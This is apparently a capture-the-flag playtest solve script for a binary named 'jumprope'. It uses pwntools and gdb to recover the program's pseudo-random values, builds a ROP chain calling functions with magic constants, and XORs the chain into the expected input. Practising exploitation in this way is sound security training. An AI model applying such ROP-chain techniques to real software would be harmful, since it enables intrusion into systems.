## Playtest by Robin_Jadoul
from pwn import *
def get_randomness(x):
    res = [x]
    io = process(["gdb", "./jumprope"])
    io.sendline("start")
    for _ in range(88):
        io.sendline(f"call (int)next({res[-1]})")
        io.recvuntil(" = ")
        res.append(int(io.recvline().strip(), 0))
    return res[1:]

context.binary = exe = ELF("jumprope")
val = u64(exe.read(exe.sym.val, 8))
x = [u64(exe.read(exe.sym.x + i * 8, 8)) for i in range(88)]
nxt = get_randomness(val)
r = ROP(exe)
r.c()
r.o(0x1337c0d3)
r.r()
r.r()
r.e()
r.c()
r.t(0xdeadface)
print(xor(r.chain(), x, nxt).decode())
